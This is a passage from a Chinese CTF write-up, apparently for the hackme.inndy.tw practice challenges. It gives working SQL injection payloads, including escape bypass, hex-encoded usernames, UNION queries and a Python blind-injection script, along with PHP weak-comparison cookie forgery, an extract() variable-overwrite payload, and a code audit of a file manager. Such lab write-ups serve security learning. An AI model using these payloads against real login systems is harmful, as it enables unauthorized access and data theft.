DB_PASS);</span><br><span class="line">    $sql = sprintf(<span class="string">"SELECT * FROM `user` WHERE `user` = '%s' AND `password` = '%s'"</span>,</span><br><span class="line">        $_POST[<span class="string">'name'</span>],</span><br><span class="line">        $_POST[<span class="string">'password'</span>]</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        $query = $db-&gt;query($sql);</span><br><span class="line">        <span class="keyword">if</span>($query) &#123;</span><br><span class="line">            $user = $query-&gt;fetchObject();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $user = <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span>(<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">        $user = <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure><p>本题是一道sql注入题目，要求我们以admin身份登录，题目过滤部分如下</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_filter</span><span class="params">($str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $strl = strtolower($str);</span><br><span class="line">    <span class="keyword">if</span> (strstr($strl, <span class="string">'or 1=1'</span>) || strstr($strl, <span class="string">'drop'</span>) ||</span><br><span class="line">        strstr($strl, <span class="string">'update'</span>) || strstr($strl, <span class="string">'delete'</span>)</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">"'"</span>, <span class="string">"\\\\'"</span>, $str);</span><br><span class="line">&#125;</span><br><span class="line">$_</span><br></pre></td></tr></table></div></figure><p>可以看到，题目过滤了 <code>or 1=1</code> 等字符，还会用反斜杠转义单引号，漏洞点就在于本题只转义引号，不转义其它字符，所以我们可以考虑用自己提交的反斜杠转义掉引号前面的反斜杠，这样引号就被脱出来了，于是我们可以成功闭合，另外由于题目转义了引号，我们在构造admin登录的时候，可以使用16进制绕过，最终payload如下</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name&#x3D;guest\&#39; or user&#x3D;0x61646d696e-- +&amp;password&#x3D;guest</span><br></pre></td></tr></table></div></figure>        <h1 id="login-as-admin-0-1">          <a href="#login-as-admin-0-1" class="heading-link"><i class="fas fa-link"></i></a>login as admin 0.1</h1>      <p>上个题目的加强版，直接union注入即可，最终payload如下</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name&#x3D;guest\&#39;  union select 1,the_f14g,3,3 from h1dden_f14g-- +&amp;password&#x3D;123465</span><br></pre></td></tr></table></div></figure>        <h1 id="login-as-admin-1">          <a href="#login-as-admin-1" class="heading-link"><i class="fas fa-link"></i></a>login as admin 1</h1>      <p>题目过滤并不严格，payload如下</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin\&#39;&#x2F;**&#x2F;or&#x2F;**&#x2F;1&#x2F;**&#x2F;limit&#x2F;**&#x2F;0,1#</span><br></pre></td></tr></table></div></figure>        <h1 id="login-as-admin-1-2">          <a href="#login-as-admin-1-2" class="heading-link"><i class="fas fa-link"></i></a>login as admin 1.2</h1>      <p>上一题的加强版，需要进行盲注，代码如下</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"https://hackme.inndy.tw/login1/index.php"</span></span><br><span class="line">length = <span class="number">1</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload1 = r"guest\'/**/union/**/select/**/1=7,2=5,3=9,(ascii(substr(database(),&#123;&#125;,1))=&#123;&#125;)#"</span></span><br><span class="line"><span class="comment"># database:login_as_admin1</span></span><br><span class="line"><span class="comment"># payload1 = r"guest\'/**/union/**/select/**/1=7,2=5,3=9,(ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()),&#123;&#125;,1))=&#123;&#125;)#"</span></span><br><span class="line"><span class="comment"># tables: 0bdb54c98123f5526ccaed982d2006a9,users</span></span><br><span class="line"><span class="comment"># payload1 = r"guest\'/**/union/**/select/**/1=7,2=5,3=9,(ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x3062646235346339383132336635353236636361656439383264323030366139),&#123;&#125;,1))=&#123;&#125;)#"</span></span><br><span class="line"><span class="comment"># id,4a391a11cfa831ca740cf8d00782f3a6</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">r"guest\'/**/union/**/select/**/1=7,2=5,3=9,(ascii(substr((select/**/group_concat(4a391a11cfa831ca740cf8d00782f3a6)/**/from/**/0bdb54c98123f5526ccaed982d2006a9),&#123;&#125;,1))=&#123;&#125;)#"</span></span><br><span class="line">data = &#123;<span class="string">'name'</span>:<span class="string">r"guest\'/**/union/**/select/**/1=7,2=5,3=9,(ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;)#"</span>, <span class="string">'password'</span>:<span class="string">"123"</span>&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">70</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">data[<span class="string">'name'</span>] = payload1.format(str(length),str(j))</span><br><span class="line">content = requests.post(url,data=data).text</span><br><span class="line"><span class="keyword">if</span> <span class="string">"FLAG"</span> <span class="keyword">in</span> content:</span><br><span class="line">flag += chr(j)</span><br><span class="line">print(<span class="string">'**flag:**'</span>,flag)</span><br><span class="line">length += <span class="number">1</span></span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></div></figure>        <h1 id="login-as-admin-3">          <a href="#login-as-admin-3" class="heading-link"><i class="fas fa-link"></i></a>login as admin 3</h1>      <p>题目要求我们以admin身份登录，漏洞点在于验证登录时的判断使用了 <code>!=</code> ，这就存在弱比较的漏洞</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">load_user</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $secret, $error;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>($_COOKIE[<span class="string">'user'</span>])) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $unserialized = json_decode(base64_decode($_COOKIE[<span class="string">'user'</span>]), <span class="keyword">true</span>);</span><br><span class="line">    $r = hash_hmac(<span class="string">'sha512'</span>, $unserialized[<span class="string">'data'</span>], $secret) != $unserialized[<span class="string">'sig'</span>];</span><br><span class="line">    <span class="keyword">if</span>(hash_hmac(<span class="string">'sha512'</span>, $unserialized[<span class="string">'data'</span>], $secret) != $unserialized[<span class="string">'sig'</span>]) &#123;</span><br><span class="line">        $error = <span class="string">'Invalid session'</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $data = json_decode($unserialized[<span class="string">'data'</span>], <span class="keyword">true</span>);</span><br><span class="line">    <span class="keyword">return</span> [</span><br><span class="line">        <span class="string">'name'</span> =&gt; $data[<span class="number">0</span>],</span><br><span class="line">        <span class="string">'admin'</span> =&gt; $data[<span class="number">1</span>]</span><br><span class="line">    ];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><p>我们只要使$unserialized[‘sig’]的值为数字0即可绕过验证</p><p>那么我们构造一个cookie</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">set_user</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $user, $secret;</span><br><span class="line">    $user = [<span class="string">'admin'</span>, <span class="keyword">true</span>];</span><br><span class="line">    $data = json_encode($user);</span><br><span class="line">    $sig = <span class="number">0</span>;</span><br><span class="line">    $all = base64_encode(json_encode([<span class="string">'sig'</span> =&gt; $sig, <span class="string">'data'</span> =&gt; $data]));</span><br><span class="line">    <span class="keyword">return</span> $all;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> set_user();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure><p>然后刷新即可</p>        <h1 id="login-as-admin-4">          <a href="#login-as-admin-4" class="heading-link"><i class="fas fa-link"></i></a>login as admin 4</h1>      <p>题目存在逻辑漏洞，重定向之后并没有exit，所以导致最终的判断被执行，所以我们只需要提交name为admin即可</p><figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -d <span class="string">"name=admin"</span> https://hackme.inndy.tw/login4/</span><br></pre></td></tr></table></div></figure>        <h1 id="Login-as-Admin-6">          <a href="#Login-as-Admin-6" class="heading-link"><i class="fas fa-link"></i></a>Login as Admin 6</h1>      <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">'data'</span>])) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        $data = json_decode($_POST[<span class="string">'data'</span>], <span class="keyword">true</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">        $data = [];</span><br><span class="line">    &#125;</span><br><span class="line">    extract($data);</span><br><span class="line">    <span class="keyword">if</span>($users[$username] &amp;&amp; strcmp($users[$username], $password) == <span class="number">0</span>) &#123;</span><br><span class="line">        $user = $username;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><p>看代码可知存在变量覆盖漏洞，构造json数据即可</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data=&#123;<span class="string">"users"</span>:&#123;<span class="string">"admin"</span>:<span class="string">"snow"</span>&#125;,<span class="string">"username"</span>:<span class="string">"admin"</span>,<span class="string">"password"</span>:<span class="string">"snow"</span>&#125;</span><br></pre></td></tr></table></div></figure>        <h1 id="login-as-admin-7">          <a href="#login-as-admin-7" class="heading-link"><i class="fas fa-link"></i></a>login as admin 7</h1>      <p>md5弱比较</p><p><img src="/2020/09/13/hackme-1/2.png" alt="payload"></p>        <h1 id="dafuq-manager-1">          <a href="#dafuq-manager-1" class="heading-link"><i class="fas fa-link"></i></a>dafuq-manager 1</h1>      <p>查看cookie可以发现 <strong><em>show_hidden</em></strong> 字段为 <strong><em>no</em></strong>，改为<strong><em>yes</em></strong>刷新即可得到flag</p>        <h1 id="dafuq-manager-2">          <a href="#dafuq-manager-2" class="heading-link"><i class="fas fa-link"></i></a>dafuq-manager 2</h1>      <p>这是一道代码审计，这是我第一次做这种整个网站源码的审计，还是有点被惊到了，万事开头难，看了别人的思路，我也开始了自己的审计之路，题目要求我们以admin的身份登录查看flag</p><p>推荐使用PHPstorm来审计这种代码，搜索定位函数和变量会方便一点，先查看入口文件index.php，找到了admin相关的部分</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">"admin"</span>:</span><br><span class="line">        <span class="keyword">require</span> <span class="string">"./core/fun_admin.php"</span>;</span><br><span class="line">        show_admin($GLOBALS[<span class="string">"dir"</span>]);</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></div></figure><p>我们跟进fun_admin.php</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show_admin</span><span class="params">($dir)</span> </span>&#123;</span><br><span class="line">    $pwd = (($GLOBALS[<span class="string">"permissions"</span>] &amp; <span class="number">2</span>) == <span class="number">2</span>);</span><br><span class="line">    $admin = (($GLOBALS[<span class="string">"permissions"</span>] &amp; <span class="number">4</span>) == <span class="number">4</span>);</span><br><span class="line">    <span class="keyword">if</span> (!$GLOBALS[<span class="string">"require_login"</span>]) show_error($GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"miscnofunc"</span>]);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($GLOBALS[<span class="string">'__GET'</span>][<span class="string">"action2"</span>])) $action2 = $GLOBALS[<span class="string">'__GET'</span>][<span class="string">"action2"</span>];</span><br><span class="line">    <span class="keyword">elseif</span> (<span class="keyword">isset</span>($GLOBALS[<span class="string">'__POST'</span>][<span class="string">"action2"</span>])) $action2 = $GLOBALS[<span class="string">'__POST'</span>][<span class="string">"action2"</span>];</span><br><span class="line">    <span class="keyword">else</span> $action2 = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">switch</span> ($action2) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">"chpwd"</span>:</span><br><span class="line">            <span class="keyword">if</span> (!$pwd) show_error($GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfunc"</span>]);</span><br><span class="line">            changepwd($dir);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">"adduser"</span>:</span><br><span class="line">            <span class="keyword">if</span> (!$admin) show_error($GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfunc"</span>]);</span><br><span class="line">            adduser($dir);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">"edituser"</span>:</span><br><span class="line">            <span class="keyword">if</span> (!$admin) show_error($GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfunc"</span>]);</span><br><span class="line">            edituser($dir);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">"rmuser"</span>:</span><br><span class="line">            <span class="keyword">if</span> (!$admin) show_error($GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfunc"</span>]);</span><br><span class="line">            removeuser($dir);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">if</span> (!$pwd &amp;&amp; !$admin) show_error($GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfunc"</span>]);</span><br><span class="line">            admin($admin, $dir);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><p>主要的限制条件在于</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$pwd = (($GLOBALS[<span class="string">"permissions"</span>] &amp; <span class="number">2</span>) == <span class="number">2</span>);</span><br><span class="line">$admin = (($GLOBALS[<span class="string">"permissions"</span>] &amp; <span class="number">4</span>) == <span class="number">4</span>);</span><br></pre></td></tr></table></div></figure><p>我们跟进这个变量看一下</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">activate_user</span><span class="params">($user, $pass)</span> </span>&#123;</span><br><span class="line">    $data = find_user($user, $pass);</span><br><span class="line">    <span class="keyword">if</span> ($data == <span class="keyword">NULL</span>) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    $GLOBALS[<span class="string">'__SESSION'</span>][<span class="string">"s_user"</span>] = $data[<span class="number">0</span>];</span><br><span class="line">    $GLOBALS[<span class="string">'__SESSION'</span>][<span class="string">"s_pass"</span>] = $data[<span class="number">1</span>];</span><br><span class="line">    $GLOBALS[<span class="string">"home_dir"</span>] = $data[<span class="number">2</span>];</span><br><span class="line">    $GLOBALS[<span class="string">"home_url"</span>] = $data[<span class="number">3</span>];</span><br><span class="line">    $GLOBALS[<span class="string">"show_hidden"</span>] = $data[<span class="number">4</span>];</span><br><span class="line">    $GLOBALS[<span class="string">"no_access"</span>] = $data[<span class="number">5</span>];</span><br><span class="line">    $GLOBALS[<span class="string">"permissions"</span>] = $data[<span class="number">6</span>];</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><p>再定位到find_user()</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> &amp;<span class="title">find_user</span><span class="params">($user, $pass)</span> </span>&#123;</span><br><span class="line">    $cnt = count($GLOBALS[<span class="string">"users"</span>]);</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>;$i &lt; $cnt;++$i) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($user == $GLOBALS[<span class="string">"users"</span>][$i][<span class="number">0</span>]) &#123;</span><br><span class="line">            <span class="keyword">if</span> ($pass == <span class="keyword">NULL</span> || ($pass == $GLOBALS[<span class="string">"users"</span>][$i][<span class="number">1</span>] &amp;&amp; $GLOBALS[<span class="string">"users"</span>][$i][<span class="number">7</span>])) &#123;</span><br><span class="line">                <span class="keyword">return</span> $GLOBALS[<span class="string">"users"</span>][$i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><p>可以看到data来自于全局变量users中，那么我们在追踪到.htusers.php中的users变量    </p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$GLOBALS[<span class="string">"users"</span>] = <span class="keyword">array</span>(</span><br><span class="line">    <span class="keyword">array</span>(<span class="string">"guest"</span>, <span class="string">"084e0343a0486ff05530df6c705c8bb4"</span>, <span class="string">"./data/guest"</span>, <span class="string">"https://game1.security.ntu.st/data/guest"</span>, <span class="number">0</span>, <span class="string">"^.ht"</span>, <span class="number">1</span>, <span class="number">1</span>),</span><br><span class="line">);</span><br></pre></td></tr></table></div></figure><p>但是源代码泄露只给出guest的信息，而没有admin的信息，所以我们可以考虑尝试读取该PHP文件的内容，所以我们可以在代码中查找文件读取相关的的函数</p><p>在fun_down.php文件中可以找到一个readfile()函数</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> (<span class="string">'core/secure.php'</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">download_item</span><span class="params">($dir, $item)</span> </span>&#123;</span><br><span class="line">    $item = basename($item);</span><br><span class="line">    <span class="keyword">if</span> (($GLOBALS[<span class="string">"permissions"</span>] &amp; <span class="number">01</span>) != <span class="number">01</span>) show_error($GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfunc"</span>]);</span><br><span class="line">    <span class="keyword">if</span> (!get_is_file($dir, $item)) show_error($item . <span class="string">": "</span> . $GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"fileexist"</span>]);</span><br><span class="line">    <span class="keyword">if</span> (!get_show_item($dir, $item)) show_error($item . <span class="string">": "</span> . $GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfile"</span>]);</span><br><span class="line">    $abs_item = get_abs_item($dir, $item);</span><br><span class="line">    <span class="keyword">if</span> (!file_in_web($abs_item) || stristr($abs_item, <span class="string">'.php'</span>) || stristr($abs_item, <span class="string">'config'</span>)) show_error($item . <span class="string">": "</span> . $GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfile"</span>]);</span><br><span class="line">    $browser = id_browser();</span><br><span class="line">    header(<span class="string">'Content-Type: '</span> . (($browser == <span class="string">'IE'</span> || $browser == <span class="string">'OPERA'</span>) ? <span class="string">'application/octetstream'</span> : <span class="string">'application/octet-stream'</span>));</span><br><span class="line">    header(<span class="string">'Expires: '</span> . gmdate(<span class="string">'D, d M Y H:i:s'</span>) . <span class="string">' GMT'</span>);</span><br><span class="line">    header(<span class="string">'Content-Transfer-Encoding: binary'</span>);</span><br><span class="line">    header(<span class="string">'Content-Length: '</span> . filesize($abs_item));</span><br><span class="line">    <span class="keyword">if</span> ($browser == <span class="string">'IE'</span>) &#123;</span><br><span class="line">        header(<span class="string">'Content-Disposition: attachment; filename="'</span> . $item . <span class="string">'"'</span>);</span><br><span class="line">        header(<span class="string">'Cache-Control: must-revalidate, post-check=0, pre-check=0'</span>);</span><br><span class="line">        header(<span class="string">'Pragma: public'</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        header(<span class="string">'Content-Disposition: attachment; filename="'</span> . $item . <span class="string">'"'</span>);</span><br><span class="line">        header(<span class="string">'Cache-Control: no-cache, must-revalidate'</span>);</span><br><span class="line">        header(<span class="string">'Pragma: no-cache'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @readfile($abs_item);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><p>题目过滤部分如下</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (($GLOBALS[<span class="string">"permissions"</span>] &amp; <span class="number">01</span>) != <span class="number">01</span>) show_error($GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfunc"</span>]);</span><br><span class="line">    <span class="keyword">if</span> (!get_is_file($dir, $item)) show_error($item . <span class="string">": "</span> . $GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"fileexist"</span>]);</span><br><span class="line">    <span class="keyword">if</span> (!get_show_item($dir, $item)) show_error($item . <span class="string">": "</span> . $GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfile"</span>]);</span><br><span class="line">    $abs_item = get_abs_item($dir, $item);</span><br><span class="line">    <span class="keyword">if</span> (!file_in_web($abs_item) || stristr($abs_item, <span class="string">'.php'</span>) || stristr($abs_item, <span class="string">'config'</span>)) show_error($item . <span class="string">": "</span> . $GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfile"</span>]);</span><br></pre></td></tr></table></div></figure><p>我们要读取的是 <code>.config/.htusers.php</code> ，但是在题目的 <code>stristr($abs_item, &#39;.php&#39;) || stristr($abs_item, &#39;config&#39;)</code> 过滤了config和php两个字段，显然无法读取，只得在看看其他的函数，在fun_edit.php中</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">edit_file</span><span class="params">($dir, $item)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (($GLOBALS[<span class="string">"permissions"</span>] &amp; <span class="number">01</span>) != <span class="number">01</span>) show_error($GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfunc"</span>]);</span><br><span class="line">    <span class="keyword">if</span> (!get_is_file($dir, $item)) show_error($item . <span class="string">": "</span> . $GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"fileexist"</span>]);</span><br><span class="line">    <span class="keyword">if</span> (!get_show_item($dir, $item)) show_error($item . <span class="string">": "</span> . $GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfile"</span>]);</span><br><span class="line">    $fname = get_abs_item($dir, $item);</span><br><span class="line">    <span class="keyword">if</span> (!file_in_web($fname)) show_error($GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfile"</span>]);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($GLOBALS[<span class="string">'__POST'</span>][<span class="string">"dosave"</span>]) &amp;&amp; $GLOBALS[<span class="string">'__POST'</span>][<span class="string">"dosave"</span>] == <span class="string">"yes"</span>) &#123;</span><br><span class="line">        $item = basename(stripslashes($GLOBALS[<span class="string">'__POST'</span>][<span class="string">"fname"</span>]));</span><br><span class="line">        $fname2 = get_abs_item($dir, $item);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>($item) || $item == <span class="string">""</span>) show_error($GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"miscnoname"</span>]);</span><br><span class="line">        <span class="keyword">if</span> ($fname != $fname2 &amp;&amp; @file_exists($fname2)) show_error($item . <span class="string">": "</span> . $GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"itemdoesexist"</span>]);</span><br><span class="line">        savefile($dir, $fname2);</span><br><span class="line">        $fname = $fname2;</span><br><span class="line">    &#125;</span><br><span class="line">    $fp = @fopen($fname, <span class="string">"r"</span>);</span><br><span class="line">    <span class="keyword">if</span> ($fp === <span class="keyword">false</span>) show_error($item . <span class="string">": "</span> . $GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"openfile"</span>]);</span><br><span class="line">    $s_item = get_rel_item($dir, $item);</span><br><span class="line">    <span class="keyword">if</span> (strlen($s_item) &gt; <span class="number">50</span>) $s_item = <span class="string">"..."</span> . substr($s_item, <span class="number">-47</span>);</span><br><span class="line">    show_header($GLOBALS[<span class="string">"messages"</span>][<span class="string">"actedit"</span>] . <span class="string">": /"</span> . 